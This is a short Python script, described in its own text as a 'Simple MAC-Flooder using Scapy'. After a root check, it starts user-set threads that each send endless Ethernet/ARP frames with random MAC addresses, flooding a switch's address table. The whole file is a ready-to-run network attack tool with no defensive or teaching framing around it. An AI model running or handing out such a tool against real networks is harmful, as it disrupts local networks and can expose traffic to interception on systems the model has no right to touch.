#!./env/bin/python3

from scapy.all import *
from time import sleep
from sys import exit as sysexit
import random
import threading
from argparse import ArgumentParser

# check for root
if not os.geteuid() == 0:
    sysexit("\nOnly root can run this script\n")

# init option parser
parser = ArgumentParser(description='Simple MAC-Flooder using Scapy')
parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
args = parser.parse_args()

# send packet
def send_packet():
    count = 0
    while True:
        sendp(Ether(src=get_random_MAC(),dst=get_random_MAC())/ARP(op=2, psrc="0.0.0.0", hwdst=get_random_MAC())/Padding(load="X"*18), verbose=0)
        count = count + 1
        print(f"Sent packet: {count}")

# generate random MAC
def get_random_MAC():
    mac = ""
    for i in range(0, 6):
        digit = hex(random.randint(17,255))
        digit = digit[2:]
        mac = mac + digit + ":"
    return mac[:-1]

# start threads
def start_threads():
    threads = int(args.threads)
    print(f"Using thread count of: {threads}")
    for i in range(1,threads):
        t = threading.Thread(target=send_packet)
        t.start()

# start here
if __name__ == "__main__":
    start_threads()
